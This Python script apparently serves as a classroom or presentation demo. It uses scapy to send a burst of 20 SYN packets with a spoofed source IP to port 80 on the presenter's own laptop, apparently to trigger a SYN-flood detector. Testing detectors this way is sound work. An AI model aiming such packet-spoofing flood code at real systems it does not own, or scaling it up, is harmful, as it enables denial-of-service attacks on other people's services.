# syn_demo_local.py - For reliable local testing
from scapy.all import IP, TCP, send
import time

# --- TARGET IP CONFIGURATION ---
# IMPORTANT: Before your presentation, you MUST update this to your laptop's 
# OWN IPv4 Address as shown by 'ipconfig' (e.g., 192.168.x.x).
TARGET_IP = "172.20.10.2" 

# Target the common HTTP port (the service being attacked)
TARGET_PORT = 80
# Send 20 packets to far exceed the sensitive SYN threshold (currently 5)
PACKET_COUNT = 20

# Source IP is spoofed to ensure all packets are tracked as a single attacker
SPOOFED_SOURCE_IP = "172.20.10.100"

print(f"Starting SYN Flood Demo against: {TARGET_IP}:{TARGET_PORT} (Count: {PACKET_COUNT})")

# Create a list of 20 SYN packets to be sent simultaneously
packets = [
    IP(src=SPOOFED_SOURCE_IP, dst=TARGET_IP)/TCP(dport=TARGET_PORT, flags="S")
    for _ in range(PACKET_COUNT)
]

# Send all packets quickly in a single batch for maximum speed
send(packets, verbose=False)

print("SYN Flood demo done (Packets sent in a quick burst).")

